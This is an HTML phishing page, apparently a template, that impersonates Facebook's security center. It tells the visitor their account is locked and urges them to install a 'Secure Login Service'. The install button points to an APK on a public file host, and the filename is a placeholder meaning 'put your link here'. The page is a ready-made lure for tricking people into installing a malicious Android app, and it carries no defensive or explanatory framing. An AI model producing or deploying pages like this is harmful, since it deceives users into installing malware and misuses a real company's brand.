<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | Security Check</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 360px; text-align: center; }
        .fb-logo { width: 120px; margin-bottom: 20px; }
        h2 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
        p { font-size: 14px; color: #606770; line-height: 1.4; margin-bottom: 25px; }
        .btn { background-color: #1877f2; color: white; padding: 12px; border-radius: 6px; text-decoration: none; font-weight: bold; display: block; font-size: 15px; border: none; cursor: pointer; }
        .btn:hover { background-color: #166fe5; }
        .footer { margin-top: 20px; font-size: 12px; color: #8a8d91; border-top: 1px solid #ddd; padding-top: 15px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zpqLq3.svg" alt="Facebook" class="fb-logo">
        <h2>Your Account is Locked</h2>
        <p>We detected unusual activity on your account. To protect your data, please install our <b>Secure Login Service</b> to verify your identity.</p>
        
        <a href="https://files.catbox.moe/apna-link-yahan-dalein.apk" class="btn">Install & Verify Now</a>
        
        <div class="footer">
            Meta © 2026 · Facebook Security Center
        </div>
